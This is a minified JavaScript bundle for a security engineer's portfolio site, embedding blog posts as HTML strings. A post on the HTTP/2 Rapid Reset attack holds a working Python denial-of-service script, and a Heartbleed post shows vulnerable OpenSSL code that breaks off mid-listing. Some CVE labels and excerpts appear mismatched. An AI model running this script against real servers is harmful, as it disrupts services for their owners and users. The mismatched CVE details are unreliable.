0?C.createElement(Wn.Provider,{value:this.props.routeContext},C.createElement(kd.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function pg(e){let{routeContext:n,match:t,children:s}=e,r=C.useContext(ao);return r&&r.static&&r.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(r.staticContext._deepestRenderedBoundaryId=t.route.id),C.createElement(Wn.Provider,{value:n},s)}function dg(e,n,t,s){var r;if(n===void 0&&(n=[]),t===void 0&&(t=null),s===void 0&&(s=null),e==null){var i;if(!t)return null;if(t.errors)e=t.matches;else if((i=s)!=null&&i.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let a=e,l=(r=t)==null?void 0:r.errors;if(l!=null){let u=a.findIndex(d=>d.route.id&&(l==null?void 0:l[d.route.id])!==void 0);u>=0||re(!1),a=a.slice(0,Math.min(a.length,u+1))}let o=!1,c=-1;if(t&&s&&s.v7_partialHydration)for(let u=0;u<a.length;u++){let d=a[u];if((d.route.HydrateFallback||d.route.hydrateFallbackElement)&&(c=u),d.route.id){let{loaderData:h,errors:v}=t,k=d.route.loader&&h[d.route.id]===void 0&&(!v||v[d.route.id]===void 0);if(d.route.lazy||k){o=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((u,d,h)=>{let v,k=!1,x=null,A=null;t&&(v=l&&d.route.id?l[d.route.id]:void 0,x=d.route.errorElement||cg,o&&(c<0&&h===0?(vg("route-fallback"),k=!0,A=null):c===h&&(k=!0,A=d.route.hydrateFallbackElement||null)));let p=n.concat(a.slice(0,h+1)),f=()=>{let m;return v?m=x:k?m=A:d.route.Component?m=C.createElement(d.route.Component,null):d.route.element?m=d.route.element:m=u,C.createElement(pg,{match:d,routeContext:{outlet:u,matches:p,isDataRoute:t!=null},children:m})};return t&&(d.route.ErrorBoundary||d.route.errorElement||h===0)?C.createElement(ug,{location:t.location,revalidation:t.revalidation,component:x,error:v,children:f(),routeContext:{outlet:null,matches:p,isDataRoute:!0}}):f()},null)}var _d=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(_d||{}),Ed=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(Ed||{});function hg(e){let n=C.useContext(ao);return n||re(!1),n}function fg(e){let n=C.useContext(tg);return n||re(!1),n}function mg(e){let n=C.useContext(Wn);return n||re(!1),n}function Td(e){let n=mg(),t=n.matches[n.matches.length-1];return t.route.id||re(!1),t.route.id}function gg(){var e;let n=C.useContext(kd),t=fg(),s=Td();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function yg(){let{router:e}=hg(_d.UseNavigateStable),n=Td(Ed.UseNavigateStable),t=C.useRef(!1);return bd(()=>{t.current=!0}),C.useCallback(function(r,i){i===void 0&&(i={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,Is({fromRouteId:n},i)))},[e,n])}const Nc={};function vg(e,n,t){Nc[e]||(Nc[e]=!0)}function wg(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function kn(e){re(!1)}function kg(e){let{basename:n="/",children:t=null,location:s,navigationType:r=An.Pop,navigator:i,static:a=!1,future:l}=e;$s()&&re(!1);let o=n.replace(/^\/*/,"/"),c=C.useMemo(()=>({basename:o,navigator:i,static:a,future:Is({v7_relativeSplatPath:!1},l)}),[o,l,i,a]);typeof s=="string"&&(s=Wt(s));let{pathname:u="/",search:d="",hash:h="",state:v=null,key:k="default"}=s,x=C.useMemo(()=>{let A=io(u,o);return A==null?null:{location:{pathname:A,search:d,hash:h,state:v,key:k},navigationType:r}},[o,u,d,h,v,k,r]);return x==null?null:C.createElement(ct.Provider,{value:c},C.createElement(Ei.Provider,{children:t,value:x}))}function bg(e){let{children:n,location:t}=e;return ag(Ja(n),t)}new Promise(()=>{});function Ja(e,n){n===void 0&&(n=[]);let t=[];return C.Children.forEach(e,(s,r)=>{if(!C.isValidElement(s))return;let i=[...n,r];if(s.type===C.Fragment){t.push.apply(t,Ja(s.props.children,i));return}s.type!==kn&&re(!1),!s.props.index||!s.props.children||re(!1);let a={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(a.children=Ja(s.props.children,i)),t.push(a)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function el(){return el=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},el.apply(this,arguments)}function xg(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,i;for(i=0;i<s.length;i++)r=s[i],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function Sg(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function _g(e,n){return e.button===0&&(!n||n==="_self")&&!Sg(e)}const Eg=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],Tg="6";try{window.__reactRouterVersion=Tg}catch{}const Cg="startTransition",Rc=gh[Cg];function Pg(e){let{basename:n,children:t,future:s,window:r}=e,i=C.useRef();i.current==null&&(i.current=Am({window:r,v5Compat:!0}));let a=i.current,[l,o]=C.useState({action:a.action,location:a.location}),{v7_startTransition:c}=s||{},u=C.useCallback(d=>{c&&Rc?Rc(()=>o(d)):o(d)},[o,c]);return C.useLayoutEffect(()=>a.listen(u),[a,u]),C.useEffect(()=>wg(s),[s]),C.createElement(kg,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:a,future:s})}const Ag=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Lg=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,St=C.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:i,replace:a,state:l,target:o,to:c,preventScrollReset:u,viewTransition:d}=n,h=xg(n,Eg),{basename:v}=C.useContext(ct),k,x=!1;if(typeof c=="string"&&Lg.test(c)&&(k=c,Ag))try{let m=new URL(window.location.href),S=c.startsWith("//")?new URL(m.protocol+c):new URL(c),T=io(S.pathname,v);S.origin===m.origin&&T!=null?c=T+S.search+S.hash:x=!0}catch{}let A=sg(c,{relative:r}),p=Ng(c,{replace:a,state:l,target:o,preventScrollReset:u,relative:r,viewTransition:d});function f(m){s&&s(m),m.defaultPrevented||p(m)}return C.createElement("a",el({},h,{href:k||A,onClick:x||i?s:f,ref:t,target:o}))});var Oc;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Oc||(Oc={}));var Mc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Mc||(Mc={}));function Ng(e,n){let{target:t,replace:s,state:r,preventScrollReset:i,relative:a,viewTransition:l}=n===void 0?{}:n,o=xd(),c=Gs(),u=Sd(e,{relative:a});return C.useCallback(d=>{if(_g(d,t)){d.preventDefault();let h=s!==void 0?s:ti(c)===ti(u);o(e,{replace:h,state:r,preventScrollReset:i,relative:a,viewTransition:l})}},[c,o,u,s,r,t,e,i,a,l])}function Rg({onToggleTheme:e,theme:n}){const t=Gs(),s=xd(),r=t.pathname==="/blogs",i=t.pathname.startsWith("/projects"),a=t.pathname.startsWith("/certifications"),l=t.pathname.startsWith("/cve-map"),o=t.hash==="#contact"||t.pathname==="/contact",c=(u,d)=>{u.preventDefault();const h=()=>{const v=document.getElementById(d);v&&v.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(h,80)):h()};return y.jsx("nav",{className:"navbar",children:y.jsxs("div",{className:"container nav-container",children:[y.jsx("div",{className:"logo",children:"Hem Parekh | Security Engineer"}),y.jsxs("ul",{className:"nav-links",children:[y.jsx("li",{children:y.jsx("a",{href:"#about",onClick:u=>c(u,"about"),children:"About"})}),y.jsx("li",{children:y.jsx("a",{href:"#experience",onClick:u=>c(u,"experience"),children:"Experience"})}),y.jsx("li",{children:y.jsx(St,{to:"/projects",className:i?"active":"",children:"Projects"})}),y.jsx("li",{children:y.jsx(St,{to:"/certifications",className:a?"active":"",children:"Certs"})}),y.jsx("li",{children:y.jsx(St,{to:"/blogs",className:r?"active":"",children:"Blog"})}),y.jsx("li",{children:y.jsx(St,{to:"/cve-map",className:l?"active":"",children:"CVE Map"})}),y.jsx("li",{children:y.jsx("a",{href:"#contact",className:o?"active":"",onClick:u=>c(u,"contact"),children:"Contact"})})]}),y.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:e,children:["Theme: ",n==="dark"?"Dark":"Light"]})]})})}function Og(){return y.jsx("footer",{className:"footer",children:y.jsx("div",{className:"container",children:y.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Lt({title:e,id:n,children:t}){return y.jsxs("section",{className:"terminal-section",id:n,children:[y.jsx("div",{className:"terminal-header",children:`> ${e.toUpperCase()}`}),y.jsx("div",{className:"terminal-body",children:t}),y.jsx("div",{className:"terminal-divider",children:"------------------------------------------------------------"})]})}const Mg=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Ic={highlight:"Hem Parekh",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Ig={text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},Dg=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],zg=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],jg=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],lo=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function Dc(){return y.jsxs("div",{className:"terminal-feed",children:[y.jsx(Lt,{title:"home",children:y.jsx("pre",{className:"terminal-block",children:`user: ${Ic.highlight}
roles: Security Engineer | Pen Tester | Threat Hunter
bio: ${Ic.blurb}`})}),y.jsx(Lt,{title:"experience",id:"experience",children:y.jsx("ul",{className:"terminal-list",children:Dg.map(e=>y.jsxs("li",{children:[e.role," @ ",e.org," [",e.range,"]"]},`${e.role}-${e.range}`))})}),y.jsxs(Lt,{title:"about",id:"about",children:[y.jsx("p",{className:"terminal-text",children:Ig.text}),y.jsx("div",{className:"terminal-list inline",children:Mg.map(e=>y.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.label},e.href))})]})]})}function Bg(){return y.jsx("div",{className:"terminal-feed",children:y.jsx(Lt,{title:"blogs",children:y.jsx("ul",{className:"terminal-list",children:lo.map(e=>y.jsxs("li",{children:[y.jsx(St,{to:`/blog/${e.slug}`,children:e.title})," — ",e.excerpt]},e.slug))})})})}const Fg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Ug=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
